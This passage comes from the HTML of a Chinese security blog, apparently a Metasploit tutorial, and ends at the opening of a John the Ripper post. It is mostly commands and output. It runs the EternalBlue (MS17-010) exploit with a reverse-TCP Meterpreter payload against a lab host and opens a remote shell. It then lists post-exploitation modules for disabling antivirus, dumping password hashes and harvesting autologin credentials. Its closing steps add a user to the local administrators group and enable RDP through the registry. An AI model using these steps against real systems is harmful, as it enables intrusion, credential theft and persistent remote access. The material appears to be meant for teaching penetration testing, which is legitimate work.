yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发起攻击</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击成功后攻击机和目标机之间会建立一个连接，得到一个meterpreter会话</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.128:4444 </span><br><span class="line">[*] 192.168.80.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.80.130:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 17 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永恒之蓝覆盖成功！</span></span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200774 bytes) to 192.168.80.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.128:4444 -&gt; 192.168.80.130:49159) at 2022-11-28 00:07:45 +0800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机与目标主机建立了一个shell会话。</span></span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure>
+
+<h3 id="（6）后渗透攻击"><a href="#（6）后渗透攻击" class="headerlink" title="（6）后渗透攻击"></a>（6）后渗透攻击</h3><p>该模块主要用于对目标机进行进一步渗透，以下是post模块中常用命令：</p>
+<ul>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm  # 查看目标主机是否允许在虚拟机上</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;migrate  # 自动进程迁移</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;killav      # 关闭杀毒软件</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp   # 开启远程桌面服务</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;autoroute      # 查看路由信息</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users   # 列举当前登录的用户</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications            # 列举应用程序</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin  # 抓取自动登录的用户名和密码</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump   # dump 出所有用户的 hash</li>
+</ul>
+<h4 id="6-1-获取-shell-，设置编码，查看-ip-信息"><a href="#6-1-获取-shell-，设置编码，查看-ip-信息" class="headerlink" title="6.1 获取 shell ，设置编码，查看 ip 信息"></a>6.1 获取 shell ，设置编码，查看 ip 信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试获取 shell</span></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 232 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解决乱码问题（部分乱码可解决）</span></span><br><span class="line">C:\Windows\system32&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ip信息</span></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Bluetooth ��������:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::d927:d59a:fcdc:3a83%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.80.130</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.80.2</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-2-创建用户，赋予最高权限"><a href="#6-2-创建用户，赋予最高权限" class="headerlink" title="6.2 创建用户，赋予最高权限"></a>6.2 创建用户，赋予最高权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前所有用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">admin                    Administrator            ghost                    </span><br><span class="line">Guest                    root                     ying                     </span><br><span class="line">The command completed with one or more errors.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin</span><br><span class="line">net user admin</span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 root 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user root</span><br><span class="line">net user root</span><br><span class="line">User name                    root</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/27 23:31:04</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2022/11/27 23:31:04</span><br><span class="line">Password required            No</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   2022/11/28 1:08:41</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户至 administrators 用户组，获取最高权限</span></span><br><span class="line">C:\Users\root\Documents&gt;net localgroup administrators admin /add </span><br><span class="line">net localgroup administrators admin /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 admin 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin </span><br><span class="line">net user admin </span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-3-查看并启用-3389-远程连接端口"><a href="#6-3-查看并启用-3389-远程连接端口" class="headerlink" title="6.3 查看并启用 3389 远程连接端口"></a>6.3 查看并启用 3389 远程连接端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口状态（3389 端口是否开启）</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 3389 远程连接端口</span></span><br><span class="line">C:\Windows\system32&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">The operation completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认端口是否开启</span></span><br><span class="line">C:\Windows\system32&gt;netstat -ano</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">Active Connections</span><br><span class="line"></span><br><span class="line">  Proto  Local Address          Foreign Address        State           PID</span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       620</span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       304</span><br><span class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       332</span><br><span class="line">  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       452</span><br><span class="line">  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       896</span><br><span class="line">  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       860</span><br><span class="line">  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       428</span><br><span class="line">  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       1700</span><br><span class="line">  TCP    192.168.80.130:139     0.0.0.0:0              LISTENING       4</span><br><span class="line">  TCP    192.168.80.130:49159   192.168.80.128:4444    ESTABLISHED     1044</span><br><span class="line">  TCP    [::]:135               [::]:0                 LISTENING       620</span><br><span class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:3389              [::]:0                 LISTENING       304</span><br><span class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</span><br><span class="line">  TCP    [::]:49152             [::]:0                 LISTENING       332</span><br><span class="line">  TCP    [::]:49153             [::]:0                 LISTENING       452</span><br><span class="line">  TCP    [::]:49154             [::]:0                 LISTENING       896</span><br><span class="line">  TCP    [::]:49155             [::]:0                 LISTENING       860</span><br><span class="line">  TCP    [::]:49156             [::]:0                 LISTENING       428</span><br><span class="line">  TCP    [::]:49158             [::]:0                 LISTENING       1700</span><br><span class="line">  UDP    0.0.0.0:500            *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:3702           *:*                                    1676</span><br><span class="line">  UDP    0.0.0.0:4500           *:*                                    860</span><br><span class="line">  UDP    0.0.0.0:5355           *:*                                    304</span><br><span class="line">  UDP    0.0.0.0:62440          *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:1900         *:*                                    1676</span><br><span class="line">  UDP    127.0.0.1:53830        *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:137     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:138     *:*                                    4</span><br><span class="line">  UDP    192.168.80.130:1900    *:*                                    1676</span><br><span class="line">  UDP    192.168.80.130:53829   *:*                                    1676</span><br><span class="line">  UDP    [::]:500               *:*                                    860</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:3702              *:*                                    1676</span><br><span class="line">  UDP    [::]:4500              *:*                                    860</span><br><span class="line">  UDP    [::]:5355              *:*                                    304</span><br><span class="line">  UDP    [::]:62441             *:*                                    1676</span><br><span class="line">  UDP    [::1]:1900             *:*                                    1676</span><br><span class="line">  UDP    [::1]:53828            *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:546  *:*                                    896</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:1900  *:*                                    1676</span><br><span class="line">  UDP    [fe80::d927:d59a:fcdc:3a83%11]:53827  *:*                                    1676</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-4-启用远程桌面，进入目标机"><a href="#6-4-启用远程桌面，进入目标机" class="headerlink" title="6.4 启用远程桌面，进入目标机"></a>6.4 启用远程桌面，进入目标机</h4><p><img src="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20221128012438324.png"></p>
+<p><img src="/2022/11/27/Metasploit-framework-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/image-20221128012419130.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/john-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/27/john-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">john 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-27 01:28:19 / 修改时间：02:21:34" itemprop="dateCreated datePublished" datetime="2022-11-27T01:28:19+08:00">2022-11-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：John-概述"><a href="#一：John-概述" class="headerlink" title="一：John 概述"></a>一：John 概述</h1><p>开膛手约翰（John the Ripper）是一个快速的密码破解程序。</p>
+<p>其主要目的是检测弱 Unix 密码。</p>
